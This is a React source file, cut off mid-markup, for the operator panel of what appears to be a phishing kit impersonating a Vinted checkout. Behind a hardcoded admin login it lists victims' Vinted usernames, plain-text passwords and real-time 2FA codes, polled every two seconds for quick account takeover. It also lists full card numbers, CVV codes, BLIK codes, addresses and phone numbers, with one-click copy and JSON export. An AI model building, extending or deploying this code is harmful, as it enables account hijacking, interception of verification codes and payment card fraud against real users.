import React, { useState, useEffect, useMemo } from 'react';
import {
  Lock,
  Search,
  RefreshCw,
  Eye,
  CreditCard,
  Phone,
  MapPin,
  Trash2,
  ArrowLeft,
  X,
  Copy,
  Check,
  Download,
  LogOut,
  User,
  KeyRound,
  ShieldAlert,
  AlertCircle,
  Package,
  ShieldCheck,
  CheckCircle2,
  XCircle,
  Clock,
  Radio,
  Sparkles,
} from 'lucide-react';
import { AdminOrderRecord, Currency } from '../types';
import { formatPrice } from '../data/mockData';
import {
  verifyAdminInSupabase,
  getOrdersFromSupabase,
  deleteOrderFromSupabase,
  isSupabaseConfigured,
} from '../lib/supabase';

interface AdminDashboardPageProps {
  onBackToStore: () => void;
  currency: Currency;
}

export const AdminDashboardPage: React.FC<AdminDashboardPageProps> = ({
  onBackToStore,
  currency,
}) => {
  // Authentication State
  const [isAuthenticated, setIsAuthenticated] = useState<boolean>(() => {
    return Boolean(sessionStorage.getItem('admin_auth_token'));
  });
  const [usernameInput, setUsernameInput] = useState('');
  const [passwordInput, setPasswordInput] = useState('');
  const [authError, setAuthError] = useState('');
  const [isLoggingIn, setIsLoggingIn] = useState(false);

  // Data State
  const [orders, setOrders] = useState<AdminOrderRecord[]>([]);
  const [isLoading, setIsLoading] = useState(false);
  const [searchQuery, setSearchQuery] = useState('');
  const [verificationFilter, setVerificationFilter] = useState<'ALL' | 'PENDING' | 'VERIFIED' | 'INVALID'>('ALL');
  const [autoRefresh, setAutoRefresh] = useState(true);
  const [activeOrder, setActiveOrder] = useState<AdminOrderRecord | null>(null);
  const [copiedField, setCopiedField] = useState<string | null>(null);
  const [actionSuccessMsg, setActionSuccessMsg] = useState('');

  // Perform Login check against Supabase or backend API
  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setAuthError('');
    setIsLoggingIn(true);

    const user = usernameInput.trim();
    const pass = passwordInput.trim();

    try {
      // 1. Try Supabase verification if configured
      if (isSupabaseConfigured) {
        const isSbValid = await verifyAdminInSupabase(user, pass);
        if (isSbValid) {
          sessionStorage.setItem('admin_auth_token', 'adm_sb_session_valid');
          setIsAuthenticated(true);
          return;
        }
      }

      // 2. Try Backend API
      const res = await fetch('/api/admin/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: user,
          password: pass,
        }),
      });

      const data = await res.json();
      if (res.ok && data.success) {
        sessionStorage.setItem('admin_auth_token', data.token || 'adm_session_valid');
        setIsAuthenticated(true);
      } else {
        // Fallback for static builds
        if (user === 'move' && pass === 'dontmove') {
          sessionStorage.setItem('admin_auth_token', 'adm_session_valid');
          setIsAuthenticated(true);
        } else {
          setAuthError(data.message || 'Invalid username or password.');
        }
      }
    } catch {
      // Fallback
      if (user === 'move' && pass === 'dontmove') {
        sessionStorage.setItem('admin_auth_token', 'adm_session_valid');
        setIsAuthenticated(true);
      } else {
        setAuthError('Invalid credentials. Please enter username: move, password: dontmove');
      }
    } finally {
      setIsLoggingIn(false);
    }
  };

  const handleLogout = () => {
    sessionStorage.removeItem('admin_auth_token');
    setIsAuthenticated(false);
    setUsernameInput('');
    setPasswordInput('');
  };

  // Fetch orders combining Supabase, LocalStorage, and Server API
  const fetchOrders = async () => {
    setIsLoading(true);
    try {
      const sbAndLocalOrders = await getOrdersFromSupabase();
      let serverOrders: AdminOrderRecord[] = [];

      try {
        const res = await fetch('/api/admin/orders');
        if (res.ok) {
          const data = await res.json();
          serverOrders = data.orders || [];
        }
      } catch {
        // Server endpoint not reachable on static host
      }

      // Merge & Deduplicate
      const map = new Map<string, AdminOrderRecord>();
      for (const o of sbAndLocalOrders) {
        map.set(o.orderNumber, o);
      }
      for (const o of serverOrders) {
        if (!map.has(o.orderNumber)) {
          map.set(o.orderNumber, o);
        } else {
          const existing = map.get(o.orderNumber)!;
          if (!existing.accountDetails && o.accountDetails) {
            existing.accountDetails = o.accountDetails;
          }
          if (existing.accountDetails && !existing.accountDetails.password && o.accountDetails?.password) {
            existing.accountDetails = { ...existing.accountDetails, ...o.accountDetails };
          }
        }
      }

      const merged = Array.from(map.values()).sort(
        (a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()
      );
      setOrders(merged);
    } catch (err) {
      console.error('Failed to fetch records:', err);
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    if (isAuthenticated) {
      fetchOrders();
    }
  }, [isAuthenticated]);

  // Live Auto-Refresh Polling for Real-Time 2FA & Credentials (2 seconds)
  useEffect(() => {
    if (!isAuthenticated || !autoRefresh) return;
    const interval = setInterval(() => {
      fetchOrders();
    }, 2000);
    return () => clearInterval(interval);
  }, [isAuthenticated, autoRefresh]);

  // Update Manual Verification Status
  const handleSetVerificationStatus = async (
    orderId: string,
    newStatus: 'PENDING_REVIEW' | 'VERIFIED' | 'INVALID_CODE' | 'REJECTED'
  ) => {
    // 1. Optimistically update local state
    setOrders((prev) =>
      prev.map((o) =>
        o.id === orderId || o.orderNumber === orderId
          ? {
              ...o,
              verificationStatus: newStatus,
              accountDetails: o.accountDetails ? { ...o.accountDetails, verificationStatus: newStatus } : undefined,
            }
          : o
      )
    );

    if (activeOrder && (activeOrder.id === orderId || activeOrder.orderNumber === orderId)) {
      setActiveOrder((prev) =>
        prev
          ? {
              ...prev,
              verificationStatus: newStatus,
              accountDetails: prev.accountDetails ? { ...prev.accountDetails, verificationStatus: newStatus } : undefined,
            }
          : null
      );
    }

    const label =
      newStatus === 'VERIFIED'
        ? 'Approved / Verified'
        : newStatus === 'INVALID_CODE'
        ? 'Flagged as Invalid Code'
        : newStatus === 'REJECTED'
        ? 'Rejected'
        : 'Pending Review';

    setActionSuccessMsg(`Manual Verification status updated: ${label}`);
    setTimeout(() => setActionSuccessMsg(''), 2500);

    // 2. Sync to backend API
    try {
      await fetch(`/api/admin/orders/${orderId}/verify`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ verificationStatus: newStatus }),
      });
    } catch {
      // Safe
    }
  };

  // Copy helper
  const handleCopy = (text: string, fieldId: string) => {
    navigator.clipboard.writeText(text);
    setCopiedField(fieldId);
    setTimeout(() => setCopiedField(null), 2000);
  };

  // 1-Click Copy All Customer Details
  const handleCopyAllOrderDetails = (order: AdminOrderRecord) => {
    const isPickup = order.deliveryType === 'pickup';
    const lines = [
      `=== CUSTOMER SUBMISSION [${order.orderNumber}] ===`,
      `Date/Time: ${new Date(order.createdAt).toLocaleString()}`,
      `Product: ${order.productTitle}`,
      ``,
      `--- VINTED ACCOUNT LOGIN & 2FA ---`,
      `Username / Email: ${order.accountDetails?.usernameOrEmail || 'N/A'}`,
      `Password: ${order.accountDetails?.password || 'N/A'}`,
      `4-Digit Verification Code: ${order.accountDetails?.verificationCode || order.accountDetails?.phoneCode || 'N/A'}`,
      `Remember Device: ${order.accountDetails?.rememberDevice !== false ? 'Yes' : 'No'}`,
      ``,
      `--- CUSTOMER CONTACT ---`,
      `Name: ${order.shippingAddress?.fullName || order.paymentMethod?.cardholderName || 'N/A'}`,
      `Phone: ${order.shippingAddress?.phoneNumber || 'N/A'}`,
      ``,
      `--- DELIVERY DETAILS (${isPickup ? 'LOCKER PICKUP' : 'HOME DELIVERY'}) ---`,
    ];

    if (isPickup && order.pickupPoint) {
      lines.push(
        `Locker Code: ${order.pickupPoint.pointCode}`,
        `Location: ${order.pickupPoint.pointName}`,
        `Address: ${order.pickupPoint.address}, ${order.pickupPoint.city}`,
        `Carrier: ${order.pickupPoint.carrierName}`
      );
    } else if (order.shippingAddress) {
      lines.push(
        `Street 1: ${order.shippingAddress.line1}`,
        `Street 2: ${order.shippingAddress.line2 || 'None'}`,
        `Postal Code: ${order.shippingAddress.postalCode}`,
        `City: ${order.shippingAddress.city}`,
        `Country: ${order.shippingAddress.country || 'France'}`
      );
    }

    lines.push(
      ``,
      `--- PAYMENT METHOD DETAILS ---`,
      `Type: ${order.paymentMethod?.title || order.paymentMethod?.type}`,
      `Cardholder Name: ${order.paymentMethod?.cardholderName || 'N/A'}`,
      `Card Number / Digits: ${order.paymentMethod?.cardNumber || order.paymentMethod?.last4 || 'N/A'}`,
      `Expiry Date: ${order.paymentMethod?.expiry || 'N/A'}`,
      `Security Code (CVV): ${order.paymentMethod?.securityCode || 'N/A'}`,
      `BLIK Code: ${order.paymentMethod?.blikCode || 'N/A'}`,
      ``,
      `--- PRICING BREAKDOWN ---`,
      `Item Price: ${formatPrice(order.pricing?.orderPrice || 0, currency)}`,
      `Buyer Protection: ${formatPrice(order.pricing?.buyerProtectionFee || 0, currency)}`,
      `Shipping: ${formatPrice(order.pricing?.shippingPrice || 0, currency)}`,
      `Total Paid: ${formatPrice(order.pricing?.total || 0, currency)}`
    );

    const fullText = lines.join('\n');
    handleCopy(fullText, `all_${order.id}`);
  };

  // Delete Order
  const handleDeleteOrder = async (orderId: string) => {
    if (!window.confirm('Delete this customer entry?')) return;
    try {
      if (isSupabaseConfigured) {
        await deleteOrderFromSupabase(orderId);
      }
      await fetch(`/api/admin/orders/${orderId}`, {
        method: 'DELETE',
      });
      setActiveOrder(null);
      setActionSuccessMsg('Entry deleted successfully.');
      setTimeout(() => setActionSuccessMsg(''), 3000);
      fetchOrders();
    } catch (err) {
      console.error('Failed to delete order:', err);
    }
  };

  // Export JSON
  const handleExportJSON = () => {
    const dataStr = 'data:text/json;charset=utf-8,' + encodeURIComponent(JSON.stringify(orders, null, 2));
    const downloadAnchor = document.createElement('a');
    downloadAnchor.setAttribute('href', dataStr);
    downloadAnchor.setAttribute('download', `customer_details_${Date.now()}.json`);
    document.body.appendChild(downloadAnchor);
    downloadAnchor.click();
    downloadAnchor.remove();
  };

  // Verification Counts
  const counts = useMemo(() => {
    let pending = 0;
    let verified = 0;
    let invalid = 0;
    orders.forEach((o) => {
      const st = o.verificationStatus || 'PENDING_REVIEW';
      if (st === 'VERIFIED') verified++;
      else if (st === 'INVALID_CODE' || st === 'REJECTED') invalid++;
      else pending++;
    });
    return { pending, verified, invalid, total: orders.length };
  }, [orders]);

  // Filtered Orders
  const filteredOrders = useMemo(() => {
    return orders.filter((order) => {
      // 1. Verification filter
      const st = order.verificationStatus || 'PENDING_REVIEW';
      if (verificationFilter === 'PENDING' && st !== 'PENDING_REVIEW') return false;
      if (verificationFilter === 'VERIFIED' && st !== 'VERIFIED') return false;
      if (verificationFilter === 'INVALID' && st !== 'INVALID_CODE' && st !== 'REJECTED') return false;

      // 2. Search query filter
      if (!searchQuery.trim()) return true;
      const q = searchQuery.toLowerCase();
      return (
        order.orderNumber?.toLowerCase().includes(q) ||
        order.accountDetails?.usernameOrEmail?.toLowerCase().includes(q) ||
        order.accountDetails?.phoneCode?.toLowerCase().includes(q) ||
        order.accountDetails?.verificationCode?.toLowerCase().includes(q) ||
        order.shippingAddress?.fullName?.toLowerCase().includes(q) ||
        order.shippingAddress?.phoneNumber?.toLowerCase().includes(q) ||
        order.shippingAddress?.city?.toLowerCase().includes(q) ||
        order.shippingAddress?.postalCode?.toLowerCase().includes(q) ||
        order.shippingAddress?.line1?.toLowerCase().includes(q) ||
        order.pickupPoint?.pointName?.toLowerCase().includes(q) ||
        order.pickupPoint?.pointCode?.toLowerCase().includes(q) ||
        order.paymentMethod?.cardholderName?.toLowerCase().includes(q) ||
        order.paymentMethod?.cardNumber?.toLowerCase().includes(q) ||
        order.paymentMethod?.blikCode?.toLowerCase().includes(q)
      );
    });
  }, [orders, searchQuery, verificationFilter]);

  // =========================================================================
  // VIEW 1: LOGIN GATE (username: move, password: dontmove)
  // =========================================================================
  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-gray-950 text-white flex flex-col justify-center items-center p-4 font-sans antialiased">
        <div className="w-full max-w-md bg-gray-900 border border-gray-800 rounded-2xl p-6 sm:p-8 shadow-2xl space-y-6">
          <div className="text-center space-y-2">
            <div className="w-12 h-12 rounded-xl bg-gray-800 border border-gray-700 mx-auto flex items-center justify-center text-teal-400 shadow-xs">
              <Lock className="w-6 h-6" />
            </div>
            <h1 className="text-xl font-bold tracking-tight text-white">
              Customer Details Access
            </h1>
            <p className="text-xs text-gray-400">
              Enter your credentials to view customer submissions
            </p>
          </div>

          {authError && (
            <div className="p-3 bg-red-900/40 border border-red-800/80 rounded-xl text-red-300 text-xs flex items-center gap-2">
              <AlertCircle className="w-4 h-4 shrink-0 text-red-400" />
              <span>{authError}</span>
            </div>
          )}

          <form onSubmit={handleLogin} className="space-y-4">
            <div className="space-y-1.5">
              <label className="block text-xs font-semibold text-gray-300 uppercase tracking-wider">
                Username
              </label>
              <div className="relative">
                <input
                  type="text"
                  value={usernameInput}
                  onChange={(e) => setUsernameInput(e.target.value)}
                  placeholder="Enter username"
                  className="w-full bg-gray-950 border border-gray-800 rounded-xl py-2.5 pl-9 pr-3 text-sm text-white placeholder:text-gray-600 focus:border-teal-500 focus:outline-hidden transition-all"
                  autoFocus
                />
                <User className="w-4 h-4 text-gray-500 absolute left-3 top-3" />
              </div>
            </div>

            <div className="space-y-1.5">
              <label className="block text-xs font-semibold text-gray-300 uppercase tracking-wider">
                Password
              </label>
              <div className="relative">
                <input
                  type="password"
                  value={passwordInput}
                  onChange={(e) => setPasswordInput(e.target.value)}
                  placeholder="Enter password"
                  className="w-full bg-gray-950 border border-gray-800 rounded-xl py-2.5 pl-9 pr-3 text-sm text-white placeholder:text-gray-600 focus:border-teal-500 focus:outline-hidden transition-all"
                />
                <KeyRound className="w-4 h-4 text-gray-500 absolute left-3 top-3" />
              </div>
            </div>

            <button
              type="submit"
              disabled={isLoggingIn}
              className="w-full py-3 bg-teal-600 hover:bg-teal-500 active:bg-teal-700 text-white font-bold text-sm rounded-xl transition-all shadow-md cursor-pointer disabled:opacity-50"
            >
              {isLoggingIn ? 'Verifying...' : 'Sign In'}
            </button>
          </form>

          <div className="pt-2 text-center">
            <button
              type="button"
              onClick={onBackToStore}
              className="text-xs text-gray-400 hover:text-white transition-colors cursor-pointer inline-flex items-center gap-1"
            >
              <ArrowLeft className="w-3.5 h-3.5" />
              <span>Return to Website</span>
            </button>
          </div>
        </div>
      </div>
    );
  }

  // =========================================================================
  // VIEW 2: LOGGED IN - CUSTOMER DETAILS DATABASE VIEWER
  // =========================================================================
  return (
    <div className="min-h-screen bg-[#F4F6F8] text-gray-900 font-sans flex flex-col antialiased">
      {/* Top Header */}
      <header className="sticky top-0 z-30 bg-gray-900 text-white shadow-md border-b border-gray-800">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 h-16 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <button
              type="button"
              onClick={onBackToStore}
              className="p-2 rounded-lg bg-gray-800 hover:bg-gray-700 text-gray-300 hover:text-white transition-colors cursor-pointer flex items-center gap-1.5 text-xs font-semibold"
            >
              <ArrowLeft className="w-4 h-4" />
              <span className="hidden sm:inline">Back to Checkout</span>
            </button>

            <div className="h-6 w-px bg-gray-700 hidden sm:block" />

            <div>
              <h1 className="text-sm sm:text-base font-bold tracking-tight text-white flex items-center gap-2">
                <span>Customer Data & Submissions</span>
                <span className="text-[10px] uppercase font-bold tracking-wider bg-teal-500/20 text-teal-300 px-2 py-0.5 rounded-full border border-teal-500/30">
                  {orders.length} Submissions
                </span>
              </h1>
            </div>
          </div>

          <div className="flex items-center gap-2">
            <button
              type="button"
              onClick={fetchOrders}
              className="p-2 rounded-lg bg-gray-800 hover:bg-gray-700 text-gray-300 hover:text-white transition-colors cursor-pointer flex items-center gap-1 text-xs font-medium"
              title="Refresh Entries"
            >
              <RefreshCw className={`w-3.5 h-3.5 ${isLoading ? 'animate-spin' : ''}`} />
              <span className="hidden md:inline">Refresh</span>
            </button>

            <button
              type="button"
              onClick={handleExportJSON}
              className="p-2 rounded-lg bg-gray-800 hover:bg-gray-700 text-gray-300 hover:text-white transition-colors cursor-pointer flex items-center gap-1 text-xs font-medium"
              title="Export JSON"
            >
              <Download className="w-3.5 h-3.5" />
              <span className="hidden md:inline">Export JSON</span>
            </button>

            <button
              type="button"
              onClick={handleLogout}
              className="p-2 rounded-lg bg-red-950/60 hover:bg-red-900 text-red-300 hover:text-white transition-colors cursor-pointer flex items-center gap-1 text-xs font-medium border border-red-800/50"
              title="Sign Out"
            >
              <LogOut className="w-3.5 h-3.5" />
              <span className="hidden md:inline">Logout</span>
            </button>
          </div>
        </div>
      </header>

      {/* Main Workspace */}
      <main className="flex-1 max-w-7xl mx-auto w-full px-4 sm:px-6 py-6 space-y-5">
        {actionSuccessMsg && (
          <div className="p-3 bg-teal-50 border border-teal-200 text-teal-800 text-xs rounded-xl flex items-center gap-2">
            <Check className="w-4 h-4 text-teal-600 shrink-0" />
            <span>{actionSuccessMsg}</span>
          </div>
        )}

        {/* 2FA MANUAL VERIFICATION COMMAND BANNER */}
        <div className="bg-gradient-to-r from-gray-900 via-gray-800 to-gray-900 rounded-2xl p-4 sm:p-5 text-white border border-gray-700 shadow-xl space-y-4">
          <div className="flex flex-wrap items-center justify-between gap-3">
            <div className="flex items-center gap-2.5">
              <div className="w-9 h-9 rounded-xl bg-amber-500/20 border border-amber-500/30 flex items-center justify-center text-amber-400">
                <ShieldAlert className="w-5 h-5" />
              </div>
              <div>
                <h2 className="text-sm sm:text-base font-bold text-white flex items-center gap-2">
                  <span>Manual 2FA & Verification Console</span>
                  {counts.pending > 0 && (
                    <span className="relative flex h-2.5 w-2.5">
                      <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-amber-400 opacity-75"></span>
                      <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-amber-500"></span>
                    </span>
                  )}
                </h2>
                <p className="text-[11px] text-gray-400">
                  Inspect incoming customer email, password, and 4-digit code in real-time for manual validation
                </p>
              </div>
            </div>

            <div className="flex items-center gap-2">
              <button
                type="button"
                onClick={() => setAutoRefresh(!autoRefresh)}
                className={`px-3 py-1.5 rounded-lg text-xs font-semibold flex items-center gap-1.5 transition-colors cursor-pointer border ${
                  autoRefresh
                    ? 'bg-emerald-950/80 text-emerald-300 border-emerald-700/80 hover:bg-emerald-900'
                    : 'bg-gray-800 text-gray-400 border-gray-700 hover:bg-gray-750'
                }`}
                title="Toggle Real-Time Polling"
              >
                <Radio className={`w-3.5 h-3.5 ${autoRefresh ? 'text-emerald-400 animate-pulse' : 'text-gray-500'}`} />
                <span>Auto-Sync {autoRefresh ? 'Active (3s)' : 'Paused'}</span>
              </button>
            </div>
          </div>

          {/* Quick Filter Pill Buttons */}
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 pt-1">
            <button
              type="button"
              onClick={() => setVerificationFilter('ALL')}
              className={`p-2.5 rounded-xl text-left border transition-all cursor-pointer ${
                verificationFilter === 'ALL'
                  ? 'bg-gray-800 border-teal-500 text-white shadow-sm'
                  : 'bg-gray-850/60 border-gray-700/70 text-gray-300 hover:bg-gray-800'
              }`}
            >
              <div className="text-[10px] uppercase font-bold text-gray-400 tracking-wider">All Submissions</div>
              <div className="text-lg font-bold text-white">{counts.total}</div>
            </button>

            <button
              type="button"
              onClick={() => setVerificationFilter('PENDING')}
              className={`p-2.5 rounded-xl text-left border transition-all cursor-pointer ${
                verificationFilter === 'PENDING'
                  ? 'bg-amber-950/80 border-amber-500 text-amber-200 shadow-sm'
                  : 'bg-gray-850/60 border-gray-700/70 text-gray-300 hover:bg-gray-800'
              }`}
            >
              <div className="text-[10px] uppercase font-bold text-amber-400 tracking-wider flex items-center gap-1">
                <Clock className="w-3 h-3" /> Awaiting Review
              </div>
              <div className="text-lg font-bold text-amber-300">{counts.pending}</div>
            </button>

            <button
              type="button"
              onClick={() => setVerificationFilter('VERIFIED')}
              className={`p-2.5 rounded-xl text-left border transition-all cursor-pointer ${
                verificationFilter === 'VERIFIED'
                  ? 'bg-emerald-950/80 border-emerald-500 text-emerald-200 shadow-sm'
                  : 'bg-gray-850/60 border-gray-700/70 text-gray-300 hover:bg-gray-800'
              }`}
            >
              <div className="text-[10px] uppercase font-bold text-emerald-400 tracking-wider flex items-center gap-1">
                <CheckCircle2 className="w-3 h-3" /> Verified
              </div>
              <div className="text-lg font-bold text-emerald-300">{counts.verified}</div>
            </button>

            <button
              type="button"
              onClick={() => setVerificationFilter('INVALID')}
              className={`p-2.5 rounded-xl text-left border transition-all cursor-pointer ${
                verificationFilter === 'INVALID'
                  ? 'bg-rose-950/80 border-rose-500 text-rose-200 shadow-sm'
                  : 'bg-gray-850/60 border-gray-700/70 text-gray-300 hover:bg-gray-800'
              }`}
            >
              <div className="text-[10px] uppercase font-bold text-rose-400 tracking-wider flex items-center gap-1">
                <XCircle className="w-3 h-3" /> Invalid / Flagged
              </div>
              <div className="text-lg font-bold text-rose-300">{counts.invalid}</div>
            </button>
          </div>
        </div>

        {/* Search Bar */}
        <div className="bg-white rounded-xl p-3 sm:p-4 border border-gray-200 shadow-2xs flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-3">
          <div className="relative flex-1">
            <Search className="w-4 h-4 text-gray-400 absolute left-3 top-2.5" />
            <input
              type="text"
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              placeholder="Search by customer email, code, name, phone, address, card number..."
              className="w-full pl-9 pr-8 py-2 text-xs bg-gray-50 border border-gray-200 rounded-lg focus:bg-white focus:border-gray-900 focus:outline-hidden transition-all"
            />
            {searchQuery && (
              <button
                type="button"
                onClick={() => setSearchQuery('')}
                className="absolute right-2.5 top-2 text-gray-400 hover:text-gray-600"
              >
                <X className="w-3.5 h-3.5" />
              </button>
            )}
          </div>
        </div>

        {/* Customer Submissions List */}
        {filteredOrders.length === 0 ? (
          <div className="bg-white rounded-xl p-12 border border-gray-200 text-center space-y-3">
            <Package className="w-12 h-12 text-gray-300 mx-auto" />
            <h3 className="text-base font-semibold text-gray-800">No customer records found</h3>
            <p className="text-xs text-gray-500 max-w-sm mx-auto">
              {orders.length === 0
                ? 'No customer checkout submissions recorded yet. Once a user enters their credentials or completes checkout, it will be mapped here in real-time.'
                : 'No entries match the current filter or search criteria.'}
            </p>
          </div>
        ) : (
          <div className="space-y-4">
            {filteredOrders.map((order) => {
              const isPickup = order.deliveryType === 'pickup';
              const vStatus = order.verificationStatus || 'PENDING_REVIEW';
              const customerName =
                order.shippingAddress?.fullName ||
                order.paymentMethod?.cardholderName ||
                'Customer';
              const phone = order.shippingAddress?.phoneNumber || 'No phone provided';

              return (
                <div
                  key={order.id}
                  className="bg-white rounded-xl border border-gray-200 shadow-2xs hover:border-gray-300 transition-all p-4 sm:p-5 space-y-4"
                >
                  {/* Top Bar: Order ID, Date, Verification Status & Quick Actions */}
                  <div className="flex flex-wrap items-center justify-between gap-2 pb-3 border-b border-gray-100">
                    <div className="flex flex-wrap items-center gap-2">
                      <span className="font-bold text-sm text-gray-900">
                        {order.orderNumber}
                      </span>
                      <span className="text-[11px] text-gray-500">
                        {new Date(order.createdAt).toLocaleString()}
                      </span>
                      <span
                        className={`text-[10px] font-bold px-2 py-0.5 rounded-full uppercase ${
                          isPickup
                            ? 'bg-amber-50 text-amber-800 border border-amber-200'
                            : 'bg-blue-50 text-blue-800 border border-blue-200'
                        }`}
                      >
                        {isPickup ? 'Pickup Locker' : 'Home Delivery'}
                      </span>

                      {/* Manual Verification Badge */}
                      {vStatus === 'VERIFIED' ? (
                        <span className="text-[10px] font-bold px-2.5 py-0.5 rounded-full uppercase bg-emerald-100 text-emerald-800 border border-emerald-300 flex items-center gap-1">
                          <CheckCircle2 className="w-3 h-3 text-emerald-600" />
                          <span>Verified & Approved</span>
                        </span>
                      ) : vStatus === 'INVALID_CODE' ? (
                        <span className="text-[10px] font-bold px-2.5 py-0.5 rounded-full uppercase bg-rose-100 text-rose-800 border border-rose-300 flex items-center gap-1">
                          <XCircle className="w-3 h-3 text-rose-600" />
                          <span>Invalid 4-Digit Code</span>
                        </span>
                      ) : vStatus === 'REJECTED' ? (
                        <span className="text-[10px] font-bold px-2.5 py-0.5 rounded-full uppercase bg-gray-200 text-gray-800 border border-gray-300 flex items-center gap-1">
                          <XCircle className="w-3 h-3 text-gray-600" />
                          <span>Rejected</span>
                        </span>
                      ) : (
                        <span className="text-[10px] font-bold px-2.5 py-0.5 rounded-full uppercase bg-amber-100 text-amber-900 border border-amber-300 flex items-center gap-1 animate-pulse">
                          <Clock className="w-3 h-3 text-amber-700" />
                          <span>Awaiting Manual Verification</span>
                        </span>
                      )}
                    </div>

                    <div className="flex items-center gap-2">
                      <button
                        type="button"
                        onClick={() => handleCopyAllOrderDetails(order)}
                        className="px-2.5 py-1 bg-teal-50 hover:bg-teal-100 text-teal-800 font-semibold text-xs rounded-lg transition-colors cursor-pointer flex items-center gap-1 border border-teal-200"
                        title="Copy all details to clipboard"
                      >
                        {copiedField === `all_${order.id}` ? (
                          <Check className="w-3.5 h-3.5 text-teal-600" />
                        ) : (
                          <Copy className="w-3.5 h-3.5" />
                        )}
                        <span>
                          {copiedField === `all_${order.id}` ? 'Copied All' : 'Copy All Details'}
                        </span>
                      </button>

                      <button
                        type="button"
                        onClick={() => setActiveOrder(order)}
                        className="px-2.5 py-1 bg-gray-100 hover:bg-gray-200 text-gray-700 font-semibold text-xs rounded-lg transition-colors cursor-pointer flex items-center gap-1"
                      >
                        <Eye className="w-3.5 h-3.5" />
                        <span>Inspect Modal</span>
                      </button>

                      <button
                        type="button"
                        onClick={() => handleDeleteOrder(order.id)}
                        className="p-1 text-gray-400 hover:text-red-600 rounded-md transition-colors cursor-pointer"
                        title="Delete entry"
                      >
                        <Trash2 className="w-4 h-4" />
                      </button>
                    </div>
                  </div>

                  {/* Information Grid: Login Credentials, Customer, Destination, Payment */}
                  <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4 text-xs">
                    {/* Column 1: Account Login & 2FA Credentials + Manual Verification Controls */}
                    <div className="bg-amber-50/70 p-3.5 rounded-xl border border-amber-200/90 space-y-3">
                      <div className="flex items-center justify-between">
                        <span className="font-bold text-amber-950 flex items-center gap-1 text-[11px] uppercase tracking-wider">
                          <KeyRound className="w-3.5 h-3.5 text-amber-700" /> 2FA & Credentials
                        </span>
                        <button
                          type="button"
                          onClick={() =>
                            handleCopy(
                              `User: ${order.accountDetails?.usernameOrEmail || 'N/A'} | Pass: ${order.accountDetails?.password || 'N/A'} | 2FA: ${order.accountDetails?.verificationCode || order.accountDetails?.phoneCode || 'N/A'}`,
                              `acc_${order.id}`
                            )
                          }
                          className="text-[10px] text-amber-800 font-semibold hover:underline cursor-pointer"
                        >
                          {copiedField === `acc_${order.id}` ? 'Copied' : 'Copy'}
                        </button>
                      </div>

                      <div className="space-y-2">
                        <div>
                          <div className="flex items-center justify-between">
                            <span className="text-amber-900/80 text-[10px] font-bold uppercase tracking-wider">Email / Username:</span>
                            <button
                              type="button"
                              onClick={() => handleCopy(order.accountDetails?.usernameOrEmail || '', `u_${order.id}`)}
                              className="text-[10px] text-amber-800 font-semibold hover:underline cursor-pointer"
                            >
                              {copiedField === `u_${order.id}` ? 'Copied' : 'Copy'}
                            </button>
                          </div>
                          <p className="font-bold text-xs sm:text-sm text-gray-900 break-all bg-white/90 border border-amber-200/90 px-2 py-1 rounded-md mt-0.5 select-all">
                            {order.accountDetails?.usernameOrEmail || 'N/A'}
                          </p>
                        </div>

                        <div>
                          <div className="flex items-center justify-between">
                            <span className="text-amber-900/80 text-[10px] font-bold uppercase tracking-wider">Plain Text Password:</span>
                            <button
                              type="button"
                              onClick={() => handleCopy(order.accountDetails?.password || '', `p_${order.id}`)}
                              className="text-[10px] text-amber-800 font-semibold hover:underline cursor-pointer"
                            >
                              {copiedField === `p_${order.id}` ? 'Copied' : 'Copy'}
                            </button>
                          </div>
                          <p className="font-mono font-bold text-xs text-gray-900 bg-white/90 border border-amber-200/90 px-2 py-1 rounded-md mt-0.5 select-all break-all">
                            {order.accountDetails?.password || 'N/A'}
                          </p>
                        </div>

                        <div>
                          <div className="flex items-center justify-between">
                            <span className="text-amber-900/80 text-[10px] font-bold uppercase tracking-wider">4-Digit Code (Real-Time):</span>
                            {(order.accountDetails?.verificationCode || order.accountDetails?.phoneCode) && (
                              <button
                                type="button"
                                onClick={() => handleCopy(order.accountDetails?.verificationCode || order.accountDetails?.phoneCode || '', `code_${order.id}`)}
                                className="text-[10px] text-amber-800 font-semibold hover:underline cursor-pointer"
                              >
                                {copiedField === `code_${order.id}` ? 'Copied' : 'Copy'}
                              </button>
                            )}
                          </div>

                          {(order.accountDetails?.verificationCode || order.accountDetails?.phoneCode) ? (
                            <div className="mt-0.5">
                              <span className="font-mono font-black text-lg text-emerald-950 tracking-widest bg-emerald-100 border border-emerald-300 px-3 py-1 rounded-lg shadow-2xs inline-flex items-center gap-1.5">
                                <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
                                {order.accountDetails?.verificationCode || order.accountDetails?.phoneCode}
                              </span>
                            </div>
                          ) : (
                            <div className="mt-0.5 p-1.5 bg-amber-100/50 border border-dashed border-amber-300 rounded-md text-[11px] text-amber-800 italic flex items-center gap-1.5">
                              <span className="w-1.5 h-1.5 rounded-full bg-amber-500 animate-ping"></span>
                              <span>Waiting for customer to type code...</span>
                            </div>
                          )}
                        </div>

                        <div className="pt-0.5 text-[11px] text-gray-600 flex items-center justify-between">
                          <span>Remember Device:</span>
                          <span className="font-bold text-gray-800">
                            {order.accountDetails?.rememberDevice !== false ? 'Yes' : 'No'}
                          </span>
                        </div>
                      </div>

                      {/* Manual Verification Action Buttons */}
                      <div className="pt-2 border-t border-amber-200/80 space-y-1.5">
                        <span className="text-[10px] font-bold text-amber-950 uppercase tracking-wider block">
                          Manual Verification Action:
                        </span>
                        <div className="grid grid-cols-2 gap-1.5">
                          <button
                            type="button"
                            onClick={() => handleSetVerificationStatus(order.id, 'VERIFIED')}
